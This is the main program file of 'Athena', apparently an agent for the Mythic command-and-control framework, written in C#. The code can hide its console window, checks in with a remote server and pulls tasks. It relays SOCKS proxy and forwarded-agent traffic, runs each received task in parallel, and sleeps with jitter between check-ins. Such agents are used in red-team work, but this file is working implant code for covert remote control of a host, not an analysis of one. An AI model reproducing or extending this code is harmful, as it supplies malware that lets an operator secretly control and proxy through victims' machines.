using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;

namespace Athena
{

    class Program
    {


#if FORCE_HIDE_WINDOW
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
#endif

        /// <summary>
        /// Main loop
        /// </summary>
        static void Main(string[] args)
        {
#if FORCE_HIDE_WINDOW
            //Hide Console Window
            ShowWindow(GetConsoleWindow(), 0);
#endif
            AsyncMain().GetAwaiter().GetResult();
        }
        
        /// <summary>
        /// Main Loop (Async)
        /// </summary>
        /// <param name="args"></param>
        /// <returns></returns>
        static async Task AsyncMain() 
        { 
            int maxMissedCheckins = 10;
            int missedCheckins = 0;
            bool exit = false;

            //MythicClient controls all of the agent communications
            MythicClient mc = new MythicClient();

            //First Checkin-In attempt
            CheckinResponse res = await mc.handleCheckin();
            
            if (!await mc.updateAgentInfo(res))
            {
                Environment.Exit(0);
            }

            //We checked in successfully, reset to 0
            missedCheckins = 0;

            //Main Loop
            while (missedCheckins != maxMissedCheckins)
            {
                try
                {
                    var delegateTask = mc.MythicConfig.forwarder.GetMessages();
                    var socksTask = mc.socksHandler.GetMessages();
                    var responsesTask = mc.commandHandler.GetResponses();

                    await Task.WhenAll(delegateTask, socksTask, responsesTask);

                    List<DelegateMessage> delegateMessages = delegateTask.Result;
                    List<SocksMessage> socksMessages = socksTask.Result;
                    List<object> responses = responsesTask.Result;

                    List<MythicTask> tasks = await mc.GetTasks(responses, delegateMessages, socksMessages);

                    if (mc.exit)
                    {
                        Environment.Exit(0);
                    }

                    if(tasks is null)
                    {
                        if (missedCheckins == maxMissedCheckins)
                        {
                            Environment.Exit(0);
                        }
                        //Return responses to waiting queue
                        await mc.commandHandler.AddResponse(responses);
                        missedCheckins++;
                    }
                    else
                    {
                        Parallel.ForEach(tasks, async c =>
                        {
                            Task.Run(() => mc.commandHandler.StartJob(c));
                        });
                    }
                }
                catch (Exception e)
                {
                    missedCheckins++;
                    if (missedCheckins == maxMissedCheckins)
                    {
                        Environment.Exit(0);
                    }
                }
                await Task.Delay(await Misc.GetSleep(mc.MythicConfig.sleep, mc.MythicConfig.jitter) * 1000);
            }
        }
    }
}
